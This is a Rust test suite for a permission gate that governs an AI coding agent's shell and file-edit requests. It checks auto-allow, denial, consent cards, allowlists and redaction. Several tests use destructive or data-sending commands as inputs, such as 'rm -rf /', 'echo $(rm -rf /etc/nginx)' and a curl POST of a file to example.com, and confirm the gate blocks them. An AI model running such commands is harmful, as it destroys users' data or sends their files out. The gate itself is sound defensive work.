    }

    #[tokio::test]
    async fn resolve_attend_mode_no_origin_is_interactive() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let mode = resolve_attend_mode(&pool, &empty_trigger_configs(), Uuid::new_v4()).await;
        assert_eq!(mode, AttendMode::Interactive);
        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    // --- unattended prompt path (DB-backed) --------------------------------

    #[tokio::test]
    async fn unattended_trigger_session_auto_allows_benign_without_card() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let trigger_id = "trig-benign";
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        insert_origin_event(
            &pool,
            thread_id,
            "MessageReceived",
            &scheduler_origin(trigger_id),
        )
        .await;
        let cfgs = trigger_configs_with(trigger_id, vec![]);

        // No broadcast is ever fired — if the call WAITED for a card, the timeout
        // would fire and fail the test. That is the no-hang invariant.
        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &cfgs,
                Path::new("/ws"),
                // Command requests — the worktree fast path never covers them.
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i".into(),
                    tool_name: "command_execution".into(),
                    input: serde_json::json!({
                        "command": "/bin/zsh -lc 'lucidos data write artifacts/work-tracker/data.json --from /tmp/x.json'"
                    }),
                },
            ),
        )
        .await
        .expect("unattended resolve must not hang");
        assert!(outcome.allowed, "benign in-workspace write auto-allows");

        assert_eq!(
            count_permission_events(&pool, thread_id).await,
            (0, 0),
            "an unattended ALLOW renders no card and records nothing"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    #[tokio::test]
    async fn unattended_trigger_denies_ungranted_side_effect() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let trigger_id = "trig-nogrant";
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        insert_origin_event(
            &pool,
            thread_id,
            "TriggerStarted",
            &scheduler_origin(trigger_id),
        )
        .await;
        let cfgs = trigger_configs_with(trigger_id, vec![]); // grants nothing

        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &cfgs,
                Path::new("/ws"),
                // Command requests — the worktree fast path never covers them.
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i".into(),
                    tool_name: "command_execution".into(),
                    input: serde_json::json!({"command": "/bin/zsh -lc 'curl -X POST https://example.com -d @x'"}),
                },
            ),
        )
        .await
        .expect("must not hang");
        assert!(!outcome.allowed, "ungranted external API auto-denies");
        // The deny is recorded, so the run is diagnosable from the timeline.
        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// The unattended amplification of the Safe fast path's refusals. A shape
    /// the guard would not settle is denied here rather than run, and the deny
    /// leaves a trace naming the command.
    #[tokio::test]
    async fn unattended_trigger_denies_a_refused_shape_and_records_it() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let trigger_id = "trig-refused";
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        insert_origin_event(
            &pool,
            thread_id,
            "TriggerStarted",
            &scheduler_origin(trigger_id),
        )
        .await;
        // Grants everything the category vocabulary can express, to pin that a
        // refused shape is denied whatever the trigger allows.
        let cfgs = trigger_configs_with(
            trigger_id,
            vec![
                SideEffectCategory::Other,
                SideEffectCategory::ExternalApi,
                SideEffectCategory::OutOfWorkspaceDestruction,
            ],
        );

        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &cfgs,
                Path::new("/ws"),
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i".into(),
                    tool_name: "command_execution".into(),
                    input: serde_json::json!({
                        "command": "/bin/zsh -lc 'echo $(rm -rf /etc/nginx)'"
                    }),
                },
            ),
        )
        .await
        .expect("must not hang");
        assert!(!outcome.allowed, "a refused shape auto-denies");
        assert_eq!(
            outcome.reason.as_deref(),
            Some(UNATTENDED_DENY_UNCLASSIFIED_REASON)
        );
        // Request AND resolution, so no card is left unanswered and the thread
        // is not parked needing attention nobody can give it.
        assert_eq!(count_permission_events(&pool, thread_id).await, (1, 1));
        let status: String =
            sqlx::query_scalar("SELECT status FROM thread_summaries WHERE thread_id = $1")
                .bind(thread_id)
                .fetch_one(&pool)
                .await
                .expect("status");
        assert_ne!(
            status,
            crate::engine::thread_lifecycle::ThreadStatus::WaitingForUserAnswer.as_str(),
            "an engine-answered request must not park the thread"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// The recorded request is persisted AND fanned out over SSE, so it takes
    /// the same scrub the interactive path applies.
    #[tokio::test]
    async fn an_unattended_deny_redacts_the_command_it_records() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let trigger_id = "trig-redact";
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        insert_origin_event(
            &pool,
            thread_id,
            "TriggerStarted",
            &scheduler_origin(trigger_id),
        )
        .await;
        let cfgs = trigger_configs_with(trigger_id, vec![]);
        let secret = "postgres://u:hunter2@localhost:5432/db";

        tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &cfgs,
                Path::new("/ws"),
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i".into(),
                    tool_name: "command_execution".into(),
                    input: serde_json::json!({
                        "command": format!("psql {secret} -c 'select 1' && echo $(rm -rf ~)")
                    }),
                },
            ),
        )
        .await
        .expect("must not hang");

        let payload: serde_json::Value = sqlx::query_scalar(
            "SELECT payload FROM events \
             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionRequest'",
        )
        .bind(thread_id)
        .fetch_one(&pool)
        .await
        .expect("recorded request");
        assert!(
            !payload.to_string().contains("hunter2"),
            "the recorded command must be scrubbed: {payload}"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// `(requests, resolutions)` recorded on `thread_id`.
    async fn count_permission_events(pool: &sqlx::PgPool, thread_id: Uuid) -> (i64, i64) {
        let one = |event_type: &'static str| async move {
            sqlx::query_scalar::<_, i64>(
                "SELECT COUNT(*) FROM events WHERE thread_id = $1 AND event_type = $2",
            )
            .bind(thread_id)
            .bind(event_type)
            .fetch_one(pool)
            .await
            .expect("count")
        };
        (
            one("CodingAgentPermissionRequest").await,
            one("CodingAgentPermissionResolved").await,
        )
    }

    #[tokio::test]
    async fn unattended_trigger_allows_granted_side_effect() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let trigger_id = "trig-grant";
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        insert_origin_event(
            &pool,
            thread_id,
            "TriggerStarted",
            &scheduler_origin(trigger_id),
        )
        .await;
        let cfgs = trigger_configs_with(trigger_id, vec![SideEffectCategory::ExternalApi]);

        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &cfgs,
                Path::new("/ws"),
                // Command requests — the worktree fast path never covers them.
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i".into(),
                    tool_name: "command_execution".into(),
                    input: serde_json::json!({"command": "/bin/zsh -lc 'curl -X POST https://example.com -d @x'"}),
                },
            ),
        )
        .await
        .expect("must not hang");
        assert!(outcome.allowed, "granted external API auto-allows");
        assert_eq!(
            outcome.reason.as_deref(),
            Some(UNATTENDED_ALLOW_GRANTED_REASON)
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// The full blocking round-trip both raise paths (CC MCP HTTP, Codex
    /// app-server bridge) share: the canonical caller emits ONE
    /// `CodingAgentPermissionRequest`, the user's click (the consent
    /// endpoint's `take` + broadcast) resolves every deduped waiter, and the
    /// outcome surfaces `allowed` correctly.
    #[tokio::test]
    async fn prompt_round_trip_emits_request_and_resolves_on_broadcast() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = crate::engine::event_bus::EventBus::new(pool.clone());
        let pending = std::sync::Arc::new(Mutex::new(PermissionState::default()));
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;

        let waiter = {
            let pool = pool.clone();
            let bus = bus.clone();
            let pending = pending.clone();
            let trigger_configs = empty_trigger_configs();
            tokio::spawn(async move {
                prompt_coding_agent_permission(
                    &pool,
                    &bus,
                    &pending,
                    &trigger_configs,
                    Path::new("/tmp"),
                    None,
                    CodingAgentPermissionInput {
                        thread_id,
                        tool_use_id: "i1".to_string(),
                        tool_name: "command_execution".to_string(),
                        input: serde_json::json!({"command": "sudo ls"}),
                    },
                )
                .await
            })
        };

        // Wait for the canonical entry to register, then resolve it the way
        // the consent endpoint does.
        let request_id = loop {
            let id = {
                let state = pending.lock().unwrap();
                state.by_request_id.keys().next().cloned()
            };
            if let Some(id) = id {
                break id;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        };
        let entry = {
            let mut state = pending.lock().unwrap();
            state.take(&request_id).expect("canonical entry present")
        };
        assert_eq!(entry.tool_name, "command_execution");
        let _ = entry.tx.send(true);

        let outcome = tokio::time::timeout(std::time::Duration::from_secs(10), waiter)
            .await
            .expect("resolves within 10s")
            .expect("task ok");
        assert!(outcome.allowed);
        assert!(outcome.reason.is_none());

        // The persisted card: exactly one request event, carrying the
        // backend-shaped tool name and the item id as tool_use_id.
        let rows: Vec<(serde_json::Value,)> = sqlx::query_as(
            "SELECT payload FROM events \
             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionRequest'",
        )
        .bind(thread_id)
        .fetch_all(&pool)
        .await
        .expect("query events");
        assert_eq!(rows.len(), 1, "one card per canonical request");
        assert_eq!(rows[0].0["tool_name"], "command_execution");
        assert_eq!(rows[0].0["tool_use_id"], "i1");
        assert_eq!(rows[0].0["summary"], "command_execution sudo ls");

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// A prior "Allow for this thread" click must short-circuit the prompt:
    /// no event, immediate allow with the session-allow reason.
    #[tokio::test]
    async fn prompt_skips_card_on_session_allow_match() {
        use crate::engine::claude_code::{derive_allow_pattern, AllowScope};
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = crate::engine::event_bus::EventBus::new(pool.clone());
        let pending = std::sync::Arc::new(Mutex::new(PermissionState::default()));
        let thread_id = Uuid::new_v4();

        let input = serde_json::json!({"command": "git status"});
        let pattern = derive_allow_pattern("Bash", &input, AllowScope::Session)
            .expect("bash derives a session pattern");
        pending.lock().unwrap().allow_session(thread_id, pattern);

        let outcome = prompt_coding_agent_permission(
            &pool,
            &bus,
            &pending,
            &empty_trigger_configs(),
            Path::new("/tmp"),
            None,
            CodingAgentPermissionInput {
                thread_id,
                tool_use_id: "i2".to_string(),
                tool_name: "Bash".to_string(),
                input,
            },
        )
        .await;
        assert!(outcome.allowed);
        assert_eq!(outcome.reason.as_deref(), Some(SESSION_ALLOW_REASON));

        let count: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM events \
             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionRequest'",
        )
        .bind(thread_id)
        .fetch_one(&pool)
        .await
        .expect("count");
        assert_eq!(count, 0, "session-allow must not render a card");

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// A workspace dir whose `cc-allowed-tools` holds `patterns`, the state an
    /// "Always allow" click leaves behind.
    fn workspace_granting(patterns: &[&str]) -> tempfile::TempDir {
        let workspace = tempfile::tempdir().expect("tempdir");
        let dir = crate::core::grants_dir(workspace.path());
        std::fs::create_dir_all(&dir).expect("grants dir");
        std::fs::write(
            dir.join(crate::core::grants::GrantFile::CodingAgentTools.file_name()),
            patterns.join("\n"),
        )
        .expect("write grant file");
        workspace
    }

    /// The reported bug: "Always allow" wrote its line, and the very next
    /// command in the SAME session raised a card anyway. The click binds now
    /// because the gate reads the workspace allowlist, rather than waiting for
    /// the respawn that refreshes CC's frozen `--allowedTools`.
    #[tokio::test]
    async fn prompt_skips_card_on_persisted_allow_match() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = crate::engine::event_bus::EventBus::new(pool.clone());
        let pending = std::sync::Arc::new(Mutex::new(PermissionState::default()));
        let thread_id = Uuid::new_v4();
        let workspace = workspace_granting(&["# header line", "", "Bash"]);

        // Timed: nothing ever answers this card, so a gate that stopped
        // covering the request would hang the suite instead of failing it.
        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &empty_trigger_configs(),
                workspace.path(),
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i3".to_string(),
                    tool_name: "Bash".to_string(),
                    // A DIFFERENT command from the one that was granted: the
                    // click was broad, so the whole tool is covered.
                    input: serde_json::json!({ "command": "cargo test" }),
                },
            ),
        )
        .await
        .expect("a granted request never waits for a card");
        assert!(outcome.allowed);
        assert_eq!(outcome.reason.as_deref(), Some(PERSISTED_ALLOW_REASON));
        assert_eq!(
            card_count(&pool, thread_id).await,
            0,
            "a persisted grant must not render a card"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// The gate sits BELOW the unattended one, so a grant a human clicked can
    /// never answer for a session no human is watching. A catastrophic command
    /// is denied whatever the allowlist says (ADR 0002).
    #[tokio::test]
    async fn an_unattended_session_ignores_the_workspace_allowlist() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = crate::engine::event_bus::EventBus::new(pool.clone());
        let pending = std::sync::Arc::new(Mutex::new(PermissionState::default()));
        let thread_id = Uuid::new_v4();
        let trigger_id = "nightly-allowlist";
        seed_cc_thread(&bus, thread_id).await;
        insert_origin_event(
            &pool,
            thread_id,
            "MessageReceived",
            &scheduler_origin(trigger_id),
        )
        .await;
        let workspace = workspace_granting(&["Bash"]);

        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &trigger_configs_with(trigger_id, vec![]),
                workspace.path(),
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i4".to_string(),
                    tool_name: "Bash".to_string(),
                    input: serde_json::json!({ "command": "rm -rf /" }),
                },
            ),
        )
        .await
        .expect("an unattended session never waits for a card");

        assert!(!outcome.allowed);
        assert_eq!(
            outcome.reason.as_deref(),
            Some(UNATTENDED_DENY_CATASTROPHIC_REASON)
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// Count the thread's persisted permission cards.
    async fn card_count(pool: &sqlx::PgPool, thread_id: Uuid) -> i64 {
        sqlx::query_scalar(
            "SELECT COUNT(*) FROM events \
             WHERE thread_id = $1 AND event_type = 'CodingAgentPermissionRequest'",
        )
        .bind(thread_id)
        .fetch_one(pool)
        .await
        .expect("count cards")
    }

    /// A file write inside the session's own worktree resolves with no card —
    /// the `.claude/rules/*.md` edit that used to cost a click on every save.
    #[tokio::test]
    async fn prompt_skips_card_for_in_worktree_write() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        let f = worktree_fixture();

        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &empty_trigger_configs(),
                Path::new("/ws"),
                Some(&f.root),
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i-wt".into(),
                    tool_name: "Edit".into(),
                    input: serde_json::json!({
                        "file_path": under(&f.root, ".claude/rules/frontend.md"),
                        "old_string": "x",
                        "new_string": "y"
                    }),
                },
            ),
        )
        .await
        .expect("in-worktree write must not wait for a card");

        assert!(outcome.allowed);
        assert_eq!(outcome.reason.as_deref(), Some(WORKTREE_WRITE_ALLOW_REASON));
        assert_eq!(
            card_count(&pool, thread_id).await,
            0,
            "the worktree fast path must not render a card"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// The negative half: a write OUTSIDE the worktree (the user's global CC
    /// config is the real-world case) still blocks on a card.
    #[tokio::test]
    async fn prompt_renders_card_for_out_of_worktree_write() {
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;

        let waiter = {
            let (pool, bus, pending) = (pool.clone(), bus.clone(), pending.clone());
            let cfgs = empty_trigger_configs();
            tokio::spawn(async move {
                prompt_coding_agent_permission(
                    &pool,
                    &bus,
                    &pending,
                    &cfgs,
                    Path::new("/ws"),
                    Some(Path::new("/ws/.lucidos/worktrees/thread-abc")),
                    CodingAgentPermissionInput {
                        thread_id,
                        tool_use_id: "i-out".into(),
                        tool_name: "Edit".into(),
                        input: serde_json::json!({ "file_path": "/home/u/.claude/settings.json" }),
                    },
                )
                .await
            })
        };

        let request_id = await_canonical_request(&pending).await;
        let entry = pending
            .lock()
            .unwrap()
            .take(&request_id)
            .expect("canonical entry present");
        let _ = entry.tx.send(true);

        let outcome = tokio::time::timeout(std::time::Duration::from_secs(10), waiter)
            .await
            .expect("resolves within 10s")
            .expect("task ok");
        assert!(outcome.allowed);
        assert_eq!(
            outcome.reason, None,
            "an out-of-worktree write must be answered by the user, not a fast path"
        );
        assert_eq!(card_count(&pool, thread_id).await, 1, "one card rendered");

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// Spin until the canonical entry lands, then hand back its request_id.
    async fn await_canonical_request(pending: &Mutex<PermissionState>) -> String {
        loop {
            let id = {
                let state = pending.lock().unwrap();
                state.by_request_id.keys().next().cloned()
            };
            if let Some(id) = id {
                return id;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
    }

    /// Persist one request + resolution pair the way the MCP consent endpoint
    /// does, so hydration has something to read.
    async fn seed_resolved_permission(
        bus: &EventBus,
        thread_id: Uuid,
        request_id: &str,
        tool_name: &str,
        input: serde_json::Value,
        allowed: bool,
        persist_scope: Option<crate::engine::claude_code::AllowScope>,
    ) {
        for event in [
            ThreadEvent::CodingAgentPermissionRequest {
                request_id: request_id.to_string(),
                tool_use_id: format!("tu-{request_id}"),
                tool_name: tool_name.to_string(),
                input: input.clone(),
                summary: build_permission_summary(tool_name, &input),
            },
            ThreadEvent::CodingAgentPermissionResolved {
                request_id: request_id.to_string(),
                allowed,
                reason: None,
                persist_scope,
            },
        ] {
            bus.emit(BusEvent::Thread {
                thread_id,
                event,
                meta: EventMeta::NONE,
            })
            .await
            .expect("seed emit")
            .expect("seed persisted");
        }
    }

    /// The restart case: the grant is durable in the events, so a FRESH
    /// `PermissionState` (what an engine restart leaves behind) must still
    /// suppress the prompt. Before hydration existed, every Apply-with-restart
    /// re-asked for a file the user had already approved on that thread.
    #[tokio::test]
    async fn session_allow_survives_a_fresh_permission_state() {
        use crate::engine::claude_code::AllowScope;
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        seed_resolved_permission(
            &bus,
            thread_id,
            "req-granted",
            "Bash",
            serde_json::json!({ "command": "git status" }),
            true,
            Some(AllowScope::Session),
        )
        .await;

        // Fresh state — no in-memory grant survives an engine restart.
        let pending = Arc::new(Mutex::new(PermissionState::default()));

        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            prompt_coding_agent_permission(
                &pool,
                &bus,
                &pending,
                &empty_trigger_configs(),
                Path::new("/ws"),
                None,
                CodingAgentPermissionInput {
                    thread_id,
                    tool_use_id: "i-after-restart".into(),
                    // Same first token as the grant, different command — the
                    // session pattern is `Bash(git:*)`.
                    tool_name: "Bash".into(),
                    input: serde_json::json!({ "command": "git commit -m wip" }),
                },
            ),
        )
        .await
        .expect("a rehydrated grant must not wait for a card");

        assert!(outcome.allowed);
        assert_eq!(outcome.reason.as_deref(), Some(SESSION_ALLOW_REASON));
        assert_eq!(
            card_count(&pool, thread_id).await,
            1,
            "only the seeded card exists — no new one was rendered"
        );
        assert!(
            pending
                .lock()
                .unwrap()
                .hydrated_threads
                .contains(&thread_id),
            "the thread is marked hydrated so later prompts skip the query"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    /// Hydration must be narrow: an Allow-once (no scope) and a Deny are NOT
    /// standing grants, so a fresh state must still render a card for them.
    #[tokio::test]
    async fn allow_once_and_deny_do_not_hydrate() {
        use crate::engine::claude_code::AllowScope;
        use crate::test_support::{setup_test_db, teardown_test_db};
        let (pool, db_name) = setup_test_db().await;
        let (bus, _rx) = EventBus::new(pool.clone());
        let thread_id = Uuid::new_v4();
        seed_cc_thread(&bus, thread_id).await;
        // Allow-once: allowed, but no scope.
        seed_resolved_permission(
            &bus,
            thread_id,
            "req-once",
            "Bash",
            serde_json::json!({ "command": "git status" }),
            true,
            None,
        )
        .await;
        // Denied WITH a session scope — the endpoint never writes this pair,
        // but the filter must reject it on `allowed` regardless.
        seed_resolved_permission(
            &bus,
            thread_id,
            "req-denied",
            "Bash",
            serde_json::json!({ "command": "git push" }),
            false,
            Some(AllowScope::Session),
        )
        .await;

        let pending = Arc::new(Mutex::new(PermissionState::default()));
        let waiter = {
            let (pool, bus, pending) = (pool.clone(), bus.clone(), pending.clone());
            let cfgs = empty_trigger_configs();
            tokio::spawn(async move {
                prompt_coding_agent_permission(
                    &pool,
                    &bus,
                    &pending,
                    &cfgs,
                    Path::new("/ws"),
                    None,
                    CodingAgentPermissionInput {
                        thread_id,
                        tool_use_id: "i-again".into(),
                        tool_name: "Bash".into(),
                        input: serde_json::json!({ "command": "git status" }),
                    },
                )
                .await
            })
        };

        let request_id = await_canonical_request(&pending).await;
        let entry = pending
            .lock()
            .unwrap()
            .take(&request_id)
            .expect("a card must be rendered");
        let _ = entry.tx.send(true);

        let outcome = tokio::time::timeout(std::time::Duration::from_secs(10), waiter)
            .await
            .expect("resolves within 10s")
            .expect("task ok");
        assert_eq!(
            outcome.reason, None,
            "answered by the user, not short-circuited by a bogus hydration"
        );
        assert!(
            !pending
                .lock()
                .unwrap()
                .session_allows
                .contains_key(&thread_id),
            "neither an Allow-once nor a Deny may become a standing grant"
        );

        pool.close().await;
        teardown_test_db(&db_name).await;
    }

    #[test]
    fn gc_dead_entries_removes_orphans_with_no_receivers() {
        let mut state = PermissionState::default();
        // A live entry — keep its receiver alive on the stack.
        let live_key: DedupKey = (Uuid::nil(), "Edit".into(), "{\"a\":1}".into());
        let live_entry = entry("req-live");
        let _live_rx = live_entry.tx.subscribe();
        state.by_dedup_key.insert(live_key.clone(), live_entry);
        state
            .by_request_id
            .insert("req-live".into(), live_key.clone());

        // A dead entry — no subscriber.
        let dead_key: DedupKey = (Uuid::nil(), "Edit".into(), "{\"b\":2}".into());
        state
            .by_dedup_key
            .insert(dead_key.clone(), entry("req-dead"));
        state
            .by_request_id
            .insert("req-dead".into(), dead_key.clone());

        state.gc_dead_entries();

        assert!(state.by_dedup_key.contains_key(&live_key), "live kept");
        assert!(state.by_request_id.contains_key("req-live"), "live kept");
        assert!(!state.by_dedup_key.contains_key(&dead_key), "dead swept");
        assert!(!state.by_request_id.contains_key("req-dead"), "dead swept");
    }
}
